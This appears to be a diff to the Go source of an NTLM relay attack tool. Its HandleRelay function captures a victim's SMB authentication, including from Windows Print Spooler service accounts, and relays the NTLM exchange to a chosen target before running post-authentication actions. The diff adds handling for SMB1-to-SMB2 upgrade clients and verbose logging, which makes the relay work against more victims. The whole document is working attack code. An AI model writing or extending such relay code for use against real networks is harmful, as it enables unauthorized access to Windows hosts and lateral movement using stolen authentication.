@@ -56,34 +56,18 @@ func HandleRelay(victimConn net.Conn, targetIP net.IP) bool {
 
 	victimConn.SetDeadline(time.Now().Add(30 * time.Second))
 
-	// --- Step 1: read victim's SMB2 NEGOTIATE --------------------------------
-	victimNeg, err := recvNB(victimConn)
-	if err != nil || !isSMB2(victimNeg) {
+	// --- Steps 1–2: negotiate + SESSION_SETUP Type 1 -------------------------
+	// Windows SMB clients (including service accounts like Print Spooler) often
+	// open with an SMB1 multi-protocol NEGOTIATE even when SMBv1 is disabled.
+	// After the SMB2 upgrade response they go directly to SESSION_SETUP without
+	// sending a second SMB2 NEGOTIATE.  We handle all three cases:
+	//   A) Direct SMB2 NEGOTIATE → SESSION_SETUP
+	//   B) SMB1 → [upgrade] → SESSION_SETUP   (Windows SpoolSS, etc.)
+	//   C) SMB1 → [upgrade] → SMB2 NEGOTIATE → SESSION_SETUP  (impacket/nxc)
+	type1Blob, setup1MsgID, ok := victimNegotiateAndType1(victimConn, id)
+	if !ok {
 		return false
 	}
-	if binary.LittleEndian.Uint16(victimNeg[12:14]) != 0x0000 {
-		return false // expected NEGOTIATE
-	}
-	negMsgID := binary.LittleEndian.Uint64(victimNeg[24:32])
-
-	// Send our own NEGOTIATE response to victim
-	if err := sendNB(victimConn, buildNegotiateResp(negMsgID)); err != nil {
-		return false
-	}
-
-	// --- Step 2: read victim's SESSION_SETUP Type 1 --------------------------
-	victimSetup1, err := recvNB(victimConn)
-	if err != nil || !isSMB2(victimSetup1) {
-		return false
-	}
-	if binary.LittleEndian.Uint16(victimSetup1[12:14]) != 0x0001 {
-		return false // expected SESSION_SETUP
-	}
-	type1Blob := extractSecBlobFromReq(victimSetup1)
-	if type1Blob == nil {
-		return false
-	}
-	setup1MsgID := binary.LittleEndian.Uint64(victimSetup1[24:32])
 
 	// --- Step 3: connect to target and negotiate -----------------------------
 	target, err := dialTarget(targetIP)
@@ -120,22 +104,31 @@ func HandleRelay(victimConn net.Conn, targetIP net.IP) bool {
 
 	// --- Step 5: forward target's Type 2 to victim ---------------------------
 	if err := sendNB(victimConn, buildSessionSetupChallengeResp(setup1MsgID, type2Blob)); err != nil {
+		core.LogVerbose("[Relay#%d] send Type2 to victim: %v", id, err)
 		target.close()
 		return false
 	}
 
 	// --- Step 6: read victim's SESSION_SETUP Type 3 --------------------------
 	victimSetup3, err := recvNB(victimConn)
-	if err != nil || !isSMB2(victimSetup3) {
+	if err != nil {
+		core.LogVerbose("[Relay#%d] read SESSION_SETUP Type3: %v", id, err)
+		target.close()
+		return false
+	}
+	if !isSMB2(victimSetup3) {
+		core.LogVerbose("[Relay#%d] Type3 not SMB2 (len=%d)", id, len(victimSetup3))
 		target.close()
 		return false
 	}
 	if binary.LittleEndian.Uint16(victimSetup3[12:14]) != 0x0001 {
+		core.LogVerbose("[Relay#%d] expected SESSION_SETUP Type3, got cmd=0x%04x", id, binary.LittleEndian.Uint16(victimSetup3[12:14]))
 		target.close()
 		return false
 	}
 	type3Blob := extractSecBlobFromReq(victimSetup3)
 	if type3Blob == nil {
+		core.LogVerbose("[Relay#%d] cannot extract Type3 blob from victim", id)
 		target.close()
 		return false
 	}
@@ -209,6 +202,80 @@ func postAuthActions(id int64, target *smbConn, targetIP net.IP, sessionID uint6
 	}
 }
 
+// victimNegotiateAndType1 drives the negotiate dance with the victim and returns
+// the NTLM Type 1 blob and its SESSION_SETUP msgID, or (nil, 0, false) on error.
+// It handles three client behaviours:
+//   A) Direct SMB2 NEGOTIATE → SESSION_SETUP
+//   B) SMB1 → [upgrade] → SESSION_SETUP       (Windows SpoolSS, etc.)
+//   C) SMB1 → [upgrade] → SMB2 NEGOTIATE → SESSION_SETUP  (impacket/nxc)
+func victimNegotiateAndType1(conn net.Conn, id int64) (type1Blob []byte, setup1MsgID uint64, ok bool) {
+	first, err := recvNB(conn)
+	if err != nil {
+		core.LogVerbose("[Relay#%d] read first msg: %v", id, err)
+		return nil, 0, false
+	}
+	if !isSMB2(first) && !isSMB1(first) {
+		core.LogVerbose("[Relay#%d] unexpected first msg (len=%d)", id, len(first))
+		return nil, 0, false
+	}
+
+	if isSMB1(first) {
+		// Send SMB2 upgrade (msgID=0, as expected by Windows for SMB1 compat)
+		core.LogVerbose("[Relay#%d] SMB1 multi-protocol → SMB2 upgrade", id)
+		if err := sendNB(conn, buildNegotiateResp(0)); err != nil {
+			core.LogVerbose("[Relay#%d] send upgrade: %v", id, err)
+			return nil, 0, false
+		}
+		// Read the next message: either SMB2 NEGOTIATE (case C) or SESSION_SETUP (case B)
+		first, err = recvNB(conn)
+		if err != nil {
+			core.LogVerbose("[Relay#%d] read after upgrade: %v", id, err)
+			return nil, 0, false
+		}
+		if !isSMB2(first) {
+			core.LogVerbose("[Relay#%d] unexpected after upgrade (len=%d)", id, len(first))
+			return nil, 0, false
+		}
+	}
+
+	// At this point first is an SMB2 message: either NEGOTIATE (0x0000) or SESSION_SETUP (0x0001)
+	if len(first) < 64 {
+		core.LogVerbose("[Relay#%d] SMB2 msg too short (%d)", id, len(first))
+		return nil, 0, false
+	}
+	cmd := binary.LittleEndian.Uint16(first[12:14])
+
+	if cmd == 0x0000 {
+		// NEGOTIATE: send our capabilities, then read SESSION_SETUP
+		negMsgID := binary.LittleEndian.Uint64(first[24:32])
+		if err := sendNB(conn, buildNegotiateResp(negMsgID)); err != nil {
+			core.LogVerbose("[Relay#%d] send negotiate resp: %v", id, err)
+			return nil, 0, false
+		}
+		first, err = recvNB(conn)
+		if err != nil {
+			core.LogVerbose("[Relay#%d] read SESSION_SETUP Type1: %v", id, err)
+			return nil, 0, false
+		}
+		if !isSMB2(first) || len(first) < 64 {
+			core.LogVerbose("[Relay#%d] SESSION_SETUP not SMB2", id)
+			return nil, 0, false
+		}
+		cmd = binary.LittleEndian.Uint16(first[12:14])
+	}
+
+	if cmd != 0x0001 {
+		core.LogVerbose("[Relay#%d] expected SESSION_SETUP, got cmd=0x%04x", id, cmd)
+		return nil, 0, false
+	}
+	blob := extractSecBlobFromReq(first)
+	if blob == nil {
+		core.LogVerbose("[Relay#%d] cannot extract Type1 blob", id)
+		return nil, 0, false
+	}
+	return blob, binary.LittleEndian.Uint64(first[24:32]), true
+}
+
 // --- frame helpers -----------------------------------------------------------
 
 func recvNB(conn net.Conn) ([]byte, error) {
@@ -240,7 +307,7 @@ func sendNB(conn net.Conn, body []byte) error {
 func buildNegotiateResp(msgID uint64) []byte {
 	spnego := core.BuildSPNEGONegotiateToken()
 
-	hdr := smb2Hdr(0x0000, msgID, 0, 0, 0)
+	hdr := smb2RespHdr(0x0000, msgID, 0, 0)
 
 	var guid [16]byte
 	rand.Read(guid[:])
@@ -253,7 +320,7 @@ func buildNegotiateResp(msgID uint64) []byte {
 
 	var body []byte
 	body = binary.LittleEndian.AppendUint16(body, 65)                   // StructureSize
-	body = binary.LittleEndian.AppendUint16(body, 0x0001)               // SecurityMode: signing enabled
+	body = binary.LittleEndian.AppendUint16(body, 0x0003)               // SecurityMode: signing enabled+required
 	body = binary.LittleEndian.AppendUint16(body, 0x0210)               // DialectRevision: SMB 2.1
 	body = binary.LittleEndian.AppendUint16(body, 0)                    // NegotiateContextCount
 	body = append(body, guid[:]...)                                      // ServerGuid
@@ -272,7 +339,7 @@ func buildNegotiateResp(msgID uint64) []byte {
 
 // buildSessionSetupChallengeResp sends the target's Type 2 blob back to the victim.
 func buildSessionSetupChallengeResp(msgID uint64, secBlob []byte) []byte {
-	hdr := smb2Hdr(0x0001, msgID, smb2StatusMoreProcessingRequired, 0x1234, 0)
+	hdr := smb2RespHdr(0x0001, msgID, smb2StatusMoreProcessingRequired, 0)
 	secBufOff := uint16(64 + 8)
 	var body []byte
 	body = binary.LittleEndian.AppendUint16(body, 9)                    // StructureSize
@@ -285,6 +352,6 @@ func buildSessionSetupChallengeResp(msgID uint64, secBlob []byte) []byte {
 
 // smb2ErrorResp builds a minimal SMB2 error response.
 func smb2ErrorResp(cmd uint16, msgID uint64, status uint32) []byte {
-	hdr := smb2Hdr(cmd, msgID, status, 0, 0)
+	hdr := smb2RespHdr(cmd, msgID, status, 0)
 	return append(hdr, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
 }
